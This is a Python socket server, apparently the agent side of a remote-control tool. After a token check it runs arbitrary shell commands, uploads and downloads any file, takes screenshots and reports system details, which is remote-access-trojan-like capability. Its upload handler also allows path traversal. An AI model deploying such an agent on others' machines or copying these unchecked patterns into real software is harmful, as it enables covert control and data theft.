# === client/server.py ===

import socket
import os
import subprocess
import threading
import platform
import pyautogui
import json
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from shared.auth import validate_token

PORT = 9999
CHUNK_SIZE = 65536

def handle_client(client_socket):
    try:
        client_socket.send(b"TOKEN?")
        token = client_socket.recv(1024).decode()
        if not validate_token(token):
            client_socket.send(b"AUTH_FAILED")
            client_socket.close()
            return

        client_socket.send(b"AUTH_SUCCESS")
        command = client_socket.recv(1024).decode().strip()

        if command == "upload":
            handle_upload(client_socket)
        elif command == "download":
            handle_download(client_socket)
        elif command == "sysinfo":
            handle_sysinfo(client_socket)
        elif command == "screenshot":
            handle_screenshot(client_socket)
        elif command.startswith("ls"):
            handle_list_files(client_socket, command)
        else:
            output = subprocess.getoutput(command)
            client_socket.send(output.encode())

    except Exception as e:
        try:
            client_socket.send(f"Error: {str(e)}".encode())
        except:
            pass
    finally:
        client_socket.close()

def handle_upload(sock):
    sock.send(b"READY")
    filename = sock.recv(1024).decode()
    sock.send(b"OK")
    filesize = int(sock.recv(1024).decode())
    sock.send(b"OK")

    save_path = os.path.join("uploads", filename)
    os.makedirs("uploads", exist_ok=True)

    with open(save_path, "wb") as f:
        received = 0
        while received < filesize:
            chunk = sock.recv(min(CHUNK_SIZE, filesize - received))
            if not chunk:
                break
            f.write(chunk)
            received += len(chunk)
    sock.send(b" File uploaded.")

def handle_download(sock):
    sock.send(b"READY")
    filepath = sock.recv(1024).decode()

    if not os.path.exists(filepath):
        sock.send(f"ERROR: File not found: {filepath}".encode())
        return

    filesize = os.path.getsize(filepath)
    sock.send(str(filesize).encode())
    sock.recv(1024)  # Wait for READY

    with open(filepath, "rb") as f:
        while True:
            data = f.read(CHUNK_SIZE)
            if not data:
                break
            sock.sendall(data)

def handle_sysinfo(sock):
    info = {
        "OS": platform.system(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Processor": platform.processor(),
        "Architecture": platform.architecture()[0],
        "Machine": platform.machine()
    }
    sock.send(json.dumps(info, indent=2).encode())

def handle_screenshot(sock):
    os.makedirs("screenshots", exist_ok=True)
    file_path = os.path.join("screenshots", "screenshot.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(file_path)

    filesize = os.path.getsize(file_path)
    sock.send(str(filesize).encode())
    sock.recv(1024)  # Wait for READY

    with open(file_path, "rb") as f:
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
            sock.sendall(chunk)


def handle_list_files(sock, command):
    try:
        path = command[3:].strip() or "."
        if not os.path.exists(path):
            sock.send(f"❌ Path does not exist: {path}".encode())
            return
        files = os.listdir(path)
        listing = "\n".join(files)
        sock.send(listing.encode())
    except Exception as e:
        sock.send(f"❌ Error: {str(e)}".encode())

def start_server():
    server = socket.socket()
    server.bind(("0.0.0.0", PORT))
    server.listen(5)
    print(f"✅ Client ready. Listening on port {PORT}...")

    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket,), daemon=True).start()

if __name__ == "__main__":
    start_server()
